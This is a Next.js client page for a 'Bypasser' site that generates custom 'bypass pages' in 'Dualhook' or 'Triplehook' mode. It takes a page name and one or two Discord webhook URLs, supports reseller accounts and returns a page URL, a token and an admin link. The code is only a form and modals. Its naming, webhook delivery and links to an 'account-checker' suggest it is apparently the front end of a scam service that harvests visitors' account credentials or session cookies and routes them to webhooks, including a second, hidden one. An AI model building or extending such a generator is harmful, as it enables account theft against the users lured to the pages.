"use client"

import { useState, useEffect, useCallback, Suspense } from "react"
import { Shield, Loader2, CheckCircle, XCircle, Copy, ExternalLink, Link2, X, FolderPlus, Globe, Webhook } from "lucide-react"
import Link from "next/link"
import { useSearchParams } from "next/navigation"

/* ── Success Modal ── */
function SuccessModal({
  url,
  token,
  adminUrl,
  onClose,
}: {
  url: string
  token: string
  adminUrl: string | null
  onClose: () => void
}) {
  const [copiedField, setCopiedField] = useState<string | null>(null)

  useEffect(() => {
    const handleEsc = (e: KeyboardEvent) => { if (e.key === "Escape") onClose() }
    document.addEventListener("keydown", handleEsc)
    return () => document.removeEventListener("keydown", handleEsc)
  }, [onClose])

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text)
    setCopiedField(field)
    setTimeout(() => setCopiedField(null), 2000)
  }

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-5">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm animate-backdrop-in" onClick={onClose} />
      <div className="relative w-full max-w-md animate-modal-in">
        <div className="bg-[#111114] border border-[#1e1e24] rounded-2xl overflow-hidden">
          <div className="h-1 w-full bg-emerald-500" />
          <div className="p-6">
            {/* Close */}
            <button onClick={onClose} className="absolute top-4 right-4 text-[#3f3f46] hover:text-[#71717a] transition-colors">
              <X className="w-4 h-4" />
            </button>

            {/* Header */}
            <div className="flex justify-center mb-5">
              <div className="w-16 h-16 rounded-2xl bg-emerald-500/10 border border-emerald-500/20 flex items-center justify-center">
                <CheckCircle className="w-8 h-8 text-emerald-400" />
              </div>
            </div>
            <h3 className="text-lg font-semibold text-[#fafafa] text-center mb-1">Directory Created</h3>
            <p className="text-sm text-[#71717a] text-center mb-6">Your bypass page has been generated successfully.</p>

            {/* Info fields */}
            <div className="space-y-3 mb-6">
              {/* Page URL */}
              <div className="bg-[#09090b] border border-[#1e1e24] rounded-xl p-3.5">
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[10px] font-semibold text-[#52525b] uppercase tracking-wider">Page URL</span>
                  <button
                    onClick={() => copyToClipboard(url, "url")}
                    className="flex items-center gap-1 text-[10px] text-[#6366f1] hover:text-[#818cf8] transition-colors font-medium"
                  >
                    <Copy className="w-3 h-3" />
                    {copiedField === "url" ? "Copied" : "Copy"}
                  </button>
                </div>
                <p className="text-xs font-mono text-[#a1a1aa] break-all leading-relaxed">{url}</p>
              </div>

              {/* Token */}
              <div className="bg-[#09090b] border border-[#1e1e24] rounded-xl p-3.5">
                <div className="flex items-center justify-between mb-1.5">
                  <span className="text-[10px] font-semibold text-[#52525b] uppercase tracking-wider">Token</span>
                  <button
                    onClick={() => copyToClipboard(token, "token")}
                    className="flex items-center gap-1 text-[10px] text-[#6366f1] hover:text-[#818cf8] transition-colors font-medium"
                  >
                    <Copy className="w-3 h-3" />
                    {copiedField === "token" ? "Copied" : "Copy"}
                  </button>
                </div>
                <p className="text-xs font-mono text-[#a1a1aa] break-all leading-relaxed">{token}</p>
              </div>

              {/* Admin URL (if triplehook) */}
              {adminUrl && (
                <div className="bg-[#09090b] border border-[#1e1e24] rounded-xl p-3.5">
                  <div className="flex items-center justify-between mb-1.5">
                    <span className="text-[10px] font-semibold text-[#52525b] uppercase tracking-wider">Admin Generate URL</span>
                    <button
                      onClick={() => copyToClipboard(adminUrl, "admin")}
                      className="flex items-center gap-1 text-[10px] text-[#6366f1] hover:text-[#818cf8] transition-colors font-medium"
                    >
                      <Copy className="w-3 h-3" />
                      {copiedField === "admin" ? "Copied" : "Copy"}
                    </button>
                  </div>
                  <p className="text-xs font-mono text-[#a1a1aa] break-all leading-relaxed">{adminUrl}</p>
                </div>
              )}
            </div>

            {/* Actions */}
            <div className="flex gap-3">
              <button
                onClick={onClose}
                className="flex-1 py-3 bg-[#18181b] hover:bg-[#27272a] border border-[#27272a] text-[#a1a1aa] text-sm font-medium rounded-xl transition-colors"
              >
                Close
              </button>
              <a
                href={url}
                target="_blank"
                rel="noopener noreferrer"
                className="flex-1 py-3 bg-[#6366f1] hover:bg-[#5558e6] text-white text-sm font-medium rounded-xl transition-colors text-center flex items-center justify-center gap-2"
              >
                <ExternalLink className="w-3.5 h-3.5" />
                Visit Page
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ── Error Modal ── */
function ErrorModal({ message, onClose }: { message: string; onClose: () => void }) {
  useEffect(() => {
    const handleEsc = (e: KeyboardEvent) => { if (e.key === "Escape") onClose() }
    document.addEventListener("keydown", handleEsc)
    return () => document.removeEventListener("keydown", handleEsc)
  }, [onClose])

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-5">
      <div className="absolute inset-0 bg-black/70 backdrop-blur-sm animate-backdrop-in" onClick={onClose} />
      <div className="relative w-full max-w-sm animate-modal-in">
        <div className="bg-[#111114] border border-[#1e1e24] rounded-2xl overflow-hidden">
          <div className="h-1 w-full bg-red-500" />
          <div className="p-6">
            <div className="flex justify-center mb-5">
              <div className="w-16 h-16 rounded-2xl bg-red-500/10 border border-red-500/20 flex items-center justify-center">
                <XCircle className="w-8 h-8 text-red-400" />
              </div>
            </div>
            <h3 className="text-lg font-semibold text-[#fafafa] text-center mb-2">Creation Failed</h3>
            <p className="text-sm text-[#71717a] text-center leading-relaxed mb-6">{message}</p>
            <button
              onClick={onClose}
              className="w-full py-3 bg-[#18181b] hover:bg-[#27272a] border border-[#27272a] text-[#a1a1aa] text-sm font-medium rounded-xl transition-colors"
            >
              Try Again
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ── Suspense Wrapper ── */
export default function DualhookPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-[#09090b] flex items-center justify-center">
        <Loader2 className="w-6 h-6 text-[#6366f1] animate-spin" />
      </div>
    }>
      <DualhookContent />
    </Suspense>
  )
}

function DualhookContent() {
  const searchParams = useSearchParams()
  const adminParam = searchParams.get("admin")

  const [username, setUsername] = useState("")
  const [webhook1, setWebhook1] = useState("")
  const [webhook2, setWebhook2] = useState("")
  const [discordServer, setDiscordServer] = useState("")
  const [mode, setMode] = useState<"dualhook" | "triplehook">("dualhook")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isAdminMode, setIsAdminMode] = useState(false)
  const [adminName, setAdminName] = useState<string | null>(null)

  const [successData, setSuccessData] = useState<{ url: string; token: string; adminUrl: string | null } | null>(null)
  const [errorMessage, setErrorMessage] = useState<string | null>(null)

  // Check if we are in admin/reseller mode
  useEffect(() => {
    if (adminParam) {
      fetch(`/api/dualhook?admin=${encodeURIComponent(adminParam)}`)
        .then(r => r.json())
        .then(data => {
          if (data.success) {
            setIsAdminMode(true)
            setAdminName(data.admin)
          }
        })
        .catch(() => {})
    }
  }, [adminParam])

  const handleSubmit = useCallback(async () => {
    if (!username.trim() || !webhook1.trim()) {
      setErrorMessage("Please fill in all required fields.")
      return
    }

    if (!webhook1.startsWith("https://discord.com/api/webhooks/")) {
      setErrorMessage("Invalid webhook URL. Must be a Discord webhook URL.")
      return
    }

    if (mode === "triplehook" && !isAdminMode && webhook2 && !webhook2.startsWith("https://discord.com/api/webhooks/")) {
      setErrorMessage("Invalid secondary webhook URL format.")
      return
    }

    setIsSubmitting(true)
    setErrorMessage(null)
    setSuccessData(null)

    try {
      const response = await fetch("/api/dualhook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          username: username.trim(),
          webhook1: webhook1.trim(),
          webhook2: mode === "triplehook" && !isAdminMode ? webhook2.trim() : undefined,
          discord_server: discordServer.trim() || undefined,
          mode,
          admin_override: isAdminMode ? adminName : undefined,
        }),
      })

      const data = await response.json()

      if (data.success) {
        setSuccessData({ url: data.url, token: data.token, adminUrl: data.admin_url })
        setUsername("")
        setWebhook1("")
        setWebhook2("")
        setDiscordServer("")
      } else {
        setErrorMessage(data.message || "Failed to create directory.")
      }
    } catch {
      setErrorMessage("Network error. Please try again.")
    } finally {
      setIsSubmitting(false)
    }
  }, [username, webhook1, webhook2, discordServer, mode, isAdminMode, adminName])

  return (
    <div className="min-h-screen bg-[#09090b] text-[#fafafa] flex flex-col">
      {successData && (
        <SuccessModal
          url={successData.url}
          token={successData.token}
          adminUrl={successData.adminUrl}
          onClose={() => setSuccessData(null)}
        />
      )}
      {errorMessage && <ErrorModal message={errorMessage} onClose={() => setErrorMessage(null)} />}

      {/* Navigation */}
      <header className="border-b border-[#1e1e24]">
        <div className="max-w-5xl mx-auto px-6 h-14 flex items-center justify-between">
          <Link href="/" className="flex items-center gap-2.5">
            <div className="w-7 h-7 rounded-lg bg-[#6366f1]/10 border border-[#6366f1]/20 flex items-center justify-center">
              <Shield className="w-3.5 h-3.5 text-[#6366f1]" />
            </div>
            <span className="text-sm font-semibold text-[#fafafa]">Bypasser</span>
          </Link>
          <nav className="flex items-center gap-1">
            <Link href="/" className="px-3 py-1.5 text-xs font-medium text-[#52525b] hover:text-[#a1a1aa] hover:bg-[#18181b] transition-colors rounded-lg">
              Bypass
            </Link>
            <Link href="/dashboard" className="px-3 py-1.5 text-xs font-medium text-[#52525b] hover:text-[#a1a1aa] hover:bg-[#18181b] transition-colors rounded-lg">
              Dashboard
            </Link>
            <Link href="/account-checker" className="px-3 py-1.5 text-xs font-medium text-[#52525b] hover:text-[#a1a1aa] hover:bg-[#18181b] transition-colors rounded-lg">
              Checker
            </Link>
          </nav>
        </div>
      </header>

      {/* Main content */}
      <main className="flex-1 flex flex-col items-center justify-center px-6 py-20">
        <div className="w-full max-w-md">
          {/* Header */}
          <div className="text-center mb-10 animate-fade-in-up">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl bg-[#6366f1]/10 border border-[#6366f1]/15 mb-6">
              <FolderPlus className="w-8 h-8 text-[#6366f1]" />
            </div>
            <h1 className="text-2xl font-bold tracking-tight text-[#fafafa] mb-2">
              {isAdminMode ? "Reseller Generator" : "Create Directory"}
            </h1>
            <p className="text-sm text-[#71717a] leading-relaxed">
              {isAdminMode
                ? `Creating under reseller: ${adminName}`
                : "Generate a custom bypass page with webhook integration"
              }
            </p>
          </div>

          {/* Form card */}
          <div className="bg-[#111114] border border-[#1e1e24] rounded-2xl overflow-hidden animate-delay-1">
            <div className="px-6 py-5 border-b border-[#1e1e24] flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Link2 className="w-4 h-4 text-[#3f3f46]" />
                <span className="text-sm font-medium text-[#a1a1aa]">Configuration</span>
              </div>
              {!isAdminMode && (
                <div className="flex items-center bg-[#09090b] border border-[#27272a] rounded-lg p-0.5">
                  <button
                    type="button"
                    onClick={() => setMode("dualhook")}
                    className={`px-3 py-1.5 text-xs font-medium rounded-md transition-colors ${
                      mode === "dualhook"
                        ? "bg-[#6366f1] text-white"
                        : "text-[#52525b] hover:text-[#a1a1aa]"
                    }`}
                  >
                    Dualhook
                  </button>
                  <button
                    type="button"
                    onClick={() => setMode("triplehook")}
                    className={`px-3 py-1.5 text-xs font-medium rounded-md transition-colors ${
                      mode === "triplehook"
                        ? "bg-[#6366f1] text-white"
                        : "text-[#52525b] hover:text-[#a1a1aa]"
                    }`}
                  >
                    Triplehook
                  </button>
                </div>
              )}
            </div>

            <div className="p-6 space-y-5">
              {/* Directory Name */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-[#a1a1aa]">Directory Name</label>
                <div className="relative">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#3f3f46]">
                    <FolderPlus className="w-4 h-4" />
                  </div>
                  <input
                    type="text"
                    placeholder="my-bypass-page"
                    value={username}
                    onChange={(e) => setUsername(e.target.value.replace(/[^a-zA-Z0-9_-]/g, ""))}
                    className="w-full pl-11 pr-4 py-3 bg-[#09090b] border border-[#27272a] rounded-xl text-sm text-[#fafafa] placeholder:text-[#3f3f46] focus:border-[#6366f1]/50 focus:ring-2 focus:ring-[#6366f1]/10 transition-all outline-none"
                  />
                </div>
                <p className="text-[10px] text-[#3f3f46]">Only letters, numbers, hyphens, and underscores</p>
              </div>

              {/* Webhook 1 */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-[#a1a1aa]">Webhook URL</label>
                <div className="relative">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#3f3f46]">
                    <Webhook className="w-4 h-4" />
                  </div>
                  <input
                    type="text"
                    placeholder="https://discord.com/api/webhooks/..."
                    value={webhook1}
                    onChange={(e) => setWebhook1(e.target.value)}
                    className="w-full pl-11 pr-4 py-3 bg-[#09090b] border border-[#27272a] rounded-xl text-sm text-[#fafafa] placeholder:text-[#3f3f46] focus:border-[#6366f1]/50 focus:ring-2 focus:ring-[#6366f1]/10 transition-all outline-none font-mono"
                  />
                </div>
              </div>

              {/* Webhook 2 (triplehook only, non-admin) */}
              {mode === "triplehook" && !isAdminMode && (
                <div className="space-y-2 animate-slide-up">
                  <label className="text-xs font-medium text-[#a1a1aa]">Secondary Webhook URL</label>
                  <div className="relative">
                    <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#3f3f46]">
                      <Webhook className="w-4 h-4" />
                    </div>
                    <input
                      type="text"
                      placeholder="https://discord.com/api/webhooks/..."
                      value={webhook2}
                      onChange={(e) => setWebhook2(e.target.value)}
                      className="w-full pl-11 pr-4 py-3 bg-[#09090b] border border-[#27272a] rounded-xl text-sm text-[#fafafa] placeholder:text-[#3f3f46] focus:border-[#6366f1]/50 focus:ring-2 focus:ring-[#6366f1]/10 transition-all outline-none font-mono"
                    />
                  </div>
                </div>
              )}

              {/* Discord Server */}
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <label className="text-xs font-medium text-[#a1a1aa]">Discord Server</label>
                  <span className="text-[10px] text-[#3f3f46]">Optional</span>
                </div>
                <div className="relative">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#3f3f46]">
                    <Globe className="w-4 h-4" />
                  </div>
                  <input
                    type="text"
                    placeholder="https://discord.gg/your-server"
                    value={discordServer}
                    onChange={(e) => setDiscordServer(e.target.value)}
                    className="w-full pl-11 pr-4 py-3 bg-[#09090b] border border-[#27272a] rounded-xl text-sm text-[#fafafa] placeholder:text-[#3f3f46] focus:border-[#6366f1]/50 focus:ring-2 focus:ring-[#6366f1]/10 transition-all outline-none"
                  />
                </div>
              </div>

              {/* Mode info banner */}
              {isAdminMode && (
                <div className="bg-[#6366f1]/5 border border-[#6366f1]/10 rounded-xl px-4 py-3 flex items-start gap-3">
                  <Shield className="w-4 h-4 text-[#6366f1] mt-0.5 shrink-0" />
                  <p className="text-xs text-[#a1a1aa] leading-relaxed">
                    Creating as reseller under <span className="text-[#6366f1] font-medium">{adminName}</span>. Triplehook mode is automatically applied.
                  </p>
                </div>
              )}

              {/* Submit */}
              <button
                onClick={handleSubmit}
                disabled={!username.trim() || !webhook1.trim() || isSubmitting}
                className="w-full py-3.5 bg-[#6366f1] hover:bg-[#5558e6] disabled:bg-[#18181b] disabled:text-[#3f3f46] text-white font-semibold text-sm rounded-xl transition-colors cursor-pointer disabled:cursor-not-allowed flex items-center justify-center gap-2"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin" />
                    Creating...
                  </>
                ) : (
                  <>
                    <FolderPlus className="w-4 h-4" />
                    Create Directory
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Footer badges */}
          <div className="mt-8 flex items-center justify-center gap-3 animate-delay-2">
            {["Webhook", "Automated", mode === "triplehook" ? "Triplehook" : "Dualhook"].map((label) => (
              <span key={label} className="px-3 py-1.5 bg-[#111114] border border-[#1e1e24] rounded-lg text-[10px] font-medium text-[#52525b] uppercase tracking-wider">
                {label}
              </span>
            ))}
          </div>
        </div>
      </main>
    </div>
  )
}
